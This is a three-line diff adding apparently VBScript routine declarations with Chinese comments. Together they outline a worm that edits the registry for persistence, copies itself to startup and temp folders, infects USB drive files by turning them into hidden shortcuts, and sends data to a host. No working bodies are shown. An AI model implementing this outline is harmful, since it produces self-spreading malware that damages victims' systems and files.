@@ -1,0 +1,3 @@
+function instance	'更改注册表
+sub install		'更改注册表，并且传播病毒到启动区及temp路径。将u盘内文件感染为快捷方式，并设为系统文件+隐藏文件
+function post (cmd ,param)	'向主机发送数据
